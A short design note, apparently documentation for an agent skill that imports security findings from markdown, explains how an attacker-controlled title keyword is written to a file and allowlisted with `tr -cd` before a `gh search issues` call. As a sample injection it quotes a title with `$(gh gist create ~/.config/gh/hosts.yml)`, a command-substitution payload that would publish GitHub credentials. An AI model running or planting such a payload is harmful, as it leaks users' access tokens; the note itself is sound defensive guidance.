<!-- SPDX-License-Identifier: Apache-2.0
     https://www.apache.org/licenses/LICENSE-2.0 -->

# security-issue-import-from-md — why the keyword goes through a file

From Step 2, as it read before the `keyword` command replaced the `tr` recipe below:

The finding title comes from the source markdown, so the keyword string is **attacker-controlled**.
`gh search issues "<keywords>"` puts it inside a double-quoted shell argument, where `$(...)` and backticks expand:
a title like `RCE in $(gh gist create ~/.config/gh/hosts.yml) handler` would survive the keyword extraction and execute.
**Use the Write tool** (not Bash) to put the raw keyword into
`<scratch>/import-md-<basename>-<index>-kw.txt` (`<basename>` is the source filename without `.md`), then strip it to a character allowlist in the shell.
`<scratch>` is the session scratch directory as an absolute path (fall back to `$TMPDIR`); `gh` may run outside the sandbox, where `$TMPDIR` differs, so pass it absolute paths.

*Write tool call:*
`file_path: <scratch>/import-md-<basename>-<index>-kw.txt`,
`content: <raw-title-keyword>`

Then clean it:

```bash
tr -cd 'A-Za-z0-9._ -' < <scratch>/import-md-<basename>-<index>-kw.txt > <scratch>/import-md-<basename>-<index>-kw.clean.txt
```

Read the cleaned file, and search with its content single-quoted:

```bash
gh search issues '<cleaned keyword>' --repo <tracker> \
  --json number,title,state,url
```

The Write tool puts the raw bytes on disk without shell tokenisation, and `tr -cd` leaves only letters, digits, `.`, `_`, space and `-`,
so the cleaned string is safe inside single quotes.
Run the two commands separately and keep the `gh` call plain: a `gh` inside `$(…)`, a pipe, or a command that also sets a variable stays sandboxed under the secure setup and fails.

`security-management issue-import-from-md keyword --file` is that `tr -cd` allowlist, read from the file the Write tool wrote; it also drops a leading `-` and prints the single-quoted search.
